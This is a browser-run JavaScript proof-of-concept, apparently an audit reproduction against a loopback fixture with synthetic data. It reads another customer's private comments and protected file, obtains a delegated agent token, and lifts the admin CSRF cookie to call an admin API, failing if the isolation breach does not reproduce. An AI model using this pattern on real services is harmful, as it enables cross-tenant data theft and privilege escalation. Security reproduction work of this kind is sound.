// Run via agent-browser eval --stdin after opening the loopback fixture's
// /__audit/publisher URL. Only synthetic data is returned; tokens are redacted.
(async () => {
  const ordinary = await fetch("/_au/comments?artifact_key=victim-abcdef");
  const suppressed = await fetch("/_au/comments?artifact_key=victim-abcdef", {
    referrerPolicy: "no-referrer",
  });
  const comments = await suppressed.json();
  const file = await fetch("/go/victim-abcdef/private.txt", {
    headers: { Accept: "text/html" },
  });
  const bytes = await file.text();
  const delegated = await fetch("/_au/agent-token", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ artifact_key: "victim-abcdef" }),
  });
  const grant = await delegated.json();
  await fetch("/admin");
  history.replaceState(null, "", "/admin");
  const csrf = decodeURIComponent(
    document.cookie
      .split("; ")
      .find((c) => c.startsWith("au_admin_csrf="))
      ?.slice("au_admin_csrf=".length) || "",
  );
  const admin = await fetch("/admin/api/overview", {
    headers: { "X-CSRF-Token": csrf },
  });
  history.replaceState(null, "", "/go/attacker-abcdef/");
  const result = {
    ordinaryComments: ordinary.status,
    suppressedRefererComments: suppressed.status,
    privateOtherCustomerCommentRead: JSON.stringify(comments).includes(
      "PRIVATE_OTHER_CUSTOMER_COMMENT",
    ),
    protectedFileStatus: file.status,
    protectedFileRead: bytes.includes("PRIVATE_FILE_BYTES"),
    delegatedTokenStatus: delegated.status,
    delegatedTokenExposed: typeof grant.token === "string",
    adminStatus: admin.status,
    adminCsrfExposed: !!csrf,
  };
  if (
    !result.privateOtherCustomerCommentRead ||
    !result.protectedFileRead ||
    !result.delegatedTokenExposed
  ) {
    throw new Error(
      `Original isolation failure did not reproduce: ${JSON.stringify(result)}`,
    );
  }
  return result;
})();
